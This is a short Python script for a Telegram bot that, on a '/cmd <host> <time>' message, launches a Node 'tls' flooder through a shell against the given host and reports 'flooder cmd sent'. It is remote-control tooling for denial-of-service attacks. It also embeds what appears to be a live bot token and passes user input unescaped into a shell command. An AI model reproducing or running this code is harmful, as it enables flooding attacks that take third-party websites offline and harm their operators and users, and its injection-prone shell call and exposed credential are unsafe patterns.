from telebot import TeleBot
import subprocess

bot = TeleBot("7721616017:AAEyX2SW4CTo6aD-vpEYKb2VFO1cL8tttgI")

@bot.message_handler(commands=['cmd'])
def send_cmd(message):
    try:
        _, host, time = message.text.split()
        subprocess.Popen(f"node tls {host} {time} 64 5 http.txt --skibidi", shell=True)
        bot.reply_to(message, f"flooder cmd sent to {host} for {time}s")
    except:
        bot.reply_to(message, "Usage /cmd <host> <time>")

bot.polling()
